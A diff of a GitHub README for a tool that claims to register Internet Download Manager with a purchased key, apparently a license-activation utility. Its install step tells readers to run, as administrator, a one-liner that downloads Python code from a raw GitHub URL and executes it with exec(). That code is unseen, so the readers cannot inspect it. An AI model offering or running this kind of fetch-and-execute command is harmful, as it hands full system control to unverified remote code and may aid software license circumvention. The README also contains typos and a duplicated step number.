@@ -1,6 +1,6 @@
 <h1 style="margin-left: 20px;">IDM Registration Utility (idman641, Build 18, Latest Version)</h1>
 
-Welcome to my repository! This IDM is not a cracked or unofficial version, it just registers IDM with a valid key that has been purchased!
+Welcome to my IDM repository! This IDM is not a cracked or unofficial version, it just registers IDM with a valid key that has been purchased!
 Crack and Unofficial versions contain Viruses and trojans, you can download the official IDM and register it via this py script.
 <img src="https://raw.githubusercontent.com/musaalif6969/IDM-Registered-Version/main/idm.png" alt="IDM Logo" width="20" height="18">
 ## Additional Resources
@@ -21,6 +21,7 @@ Here's a screenshot of what the Registered IDM looks like:
 
 ## How to Use
 1. Install Python on your device.
+2. Install IDM letest version form their website.
 2. Copy this command, and past it on cmd (Administration required)
 ```python
 pip install requests psutil && python -c "import requests, psutil; exec(requests.get('https://raw.githubusercontent.com/musaalif6969/IDM-Registration-Utility/main/main.py').text)"
@@ -33,7 +34,7 @@ pip install requests psutil && python -c "import requests, psutil; exec(requests
 ---
 
 ## Additional Info
-
+Do not use it manually!
 
 ```ini
 ; First Name
